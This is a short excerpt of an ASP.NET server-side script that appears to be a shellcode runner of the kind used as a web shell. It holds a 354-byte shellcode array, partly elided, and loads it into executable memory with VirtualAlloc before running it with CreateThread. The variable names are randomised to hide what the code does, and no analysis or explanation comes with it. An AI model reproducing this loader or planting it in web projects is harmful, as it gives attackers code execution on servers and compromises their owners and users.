...
<script runat="server">
    ...
    {
        byte[] oVO5jw1CM = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,
...
0xd5};
        ...
        IntPtr coAFmu = VirtualAlloc(IntPtr.Zero,(UIntPtr)oVO5jw1CM.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(oVO5jw1CM,0,coAFmu,oVO5jw1CM.Length);
        IntPtr pcWwQUvq9r = IntPtr.Zero;
        IntPtr uzDczGxM = CreateThread(IntPtr.Zero,UIntPtr.Zero,coAFmu,IntPtr.Zero,0,ref pcWwQUvq9r);
    }
</script>
